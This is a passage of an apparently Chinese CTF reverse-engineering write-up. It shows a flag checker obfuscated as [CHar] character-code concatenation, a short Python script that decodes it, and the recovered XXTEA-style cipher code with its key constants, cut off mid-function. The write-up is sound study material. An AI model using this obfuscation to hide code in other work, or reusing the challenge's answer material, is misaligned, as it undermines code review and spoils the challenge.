class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">57</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">53</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">52</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">56</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">55</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">54</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">35</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">82</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">80</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">67</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">104</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">33</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">70</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">42</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">123</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">125</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">33</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">34</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">120</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">78</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">33</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">39</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span></span><br></pre></td></tr></tbody></table></figure><p>简单解析一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"./output"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    out=f.read()</span><br><span class="line"></span><br><span class="line">res=out.split(<span class="hljs-string">"+"</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(res))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:</span><br><span class="line">    tmp=i[<span class="hljs-number">6</span>:]</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp)),end=<span class="hljs-string">""</span>)</span><br></pre></td></tr></tbody></table></figure><p>真正执行的代码如下：</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chiper</span>():</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span></span><br><span class="line">        self.d = <span class="hljs-number">0x87654321</span></span><br><span class="line">        k0 = <span class="hljs-number">0x67452301</span></span><br><span class="line">        k1 = <span class="hljs-number">0xefcdab89</span></span><br><span class="line">        k2 = <span class="hljs-number">0x98badcfe</span></span><br><span class="line">        k3 = <span class="hljs-number">0x10325476</span></span><br><span class="line">        self.k = [k0, k1, k2, k3]</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">e</span>(<span class="hljs-params">self, n, v</span>):</span></span><br><span class="line">        <span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">MX</span>(<span class="hljs-params">z, y, total, key, p, e</span>):</span></span><br><span class="line">            temp1 = (z.value &gt;&gt; <span class="hljs-number">6</span> ^ y.value &lt;&lt; <span class="hljs-number">4</span>) + \</span><br><span class="line">                (y.value &gt;&gt; <span class="hljs-number">2</span> ^ z.value &lt;&lt; <span class="hljs-number">5</span>)</span><br><span class="line">            temp2 = (total.value ^ y.value) + \</span><br><span class="line">                (key[(p &amp; <span class="hljs-number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line">            <span class="hljs-keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line">        key = self.k</span><br><span class="line">        delta = self.d</span><br><span class="line">        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>//n</span><br><span class="line">        total = c_uint32(<span class="hljs-number">0</span>)</span><br><span class="line">        z = c_uint32(v[n-<span class="hljs-number">1</span>])</span><br><span class="line">        e = c_uint32(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:</span><br><span class="line">            total.value += delta</span><br><span class="line">            e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-<span class="hljs-number">1</span>):</span><br><span class="line">                y = c_uint32(v[p+<span class="hljs-number">1</span>])</span><br><span class="line">                v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value</span><br><span class="line">                z.value = v[p]</span><br><span class="line">            y = c_uint32(v[<span class="hljs-number">0</span>])</span><br><span class="line">            v[n-<span class="hljs-number">1</span>] = c_uint32(v[n-<span class="hljs-number">1</span>] + MX(z, y, total,</span><br><span class="line">                              key, n-<span class="hljs-number">1</span>, e).value).value</span><br><span class="line">            z.value = v[n-<span class="hljs-number">1</span>]</span><br><span class="line">            rounds -= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytes2ints</span>(<span class="hljs-params">self,cs:<span class="hljs-built_in">bytes</span></span>)-&gt;<span class="hljs-built_in">list</span>:</span></span><br><span class="line">        new_length=<span class="hljs-built_in">len</span>(cs)+(<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(cs)%<span class="hljs-number">8</span>)%<span class="hljs-number">8</span></span><br><span class="line">        barray=cs.ljust(new_length,<span class="hljs-string">b'\x00'</span>)</span><br><span class="line">        i=<span class="hljs-number">0</span></span><br><span class="line">        v=[]</span><br><span class="line">        <span class="hljs-keyword">while</span> i &lt; new_length:</span><br><span class="line">            v0 = <span class="hljs-built_in">int</span>.from_bytes(barray[i:i+<span class="hljs-number">4</span>], <span class="hljs-string">'little'</span>)</span><br><span class="line">            v1 = <span class="hljs-built_in">int</span>.from_bytes(barray[i+<span class="hljs-number">4</span>:i+<span class="hljs-number">8</span>], <span class="hljs-string">'little'</span>)</span><br><span class="line">            v.append(v0)</span><br><span class="line">            v.append(v1)</span><br><span class="line">            i += <span class="hljs-number">8</span></span><br><span class="line">        <span class="hljs-keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span 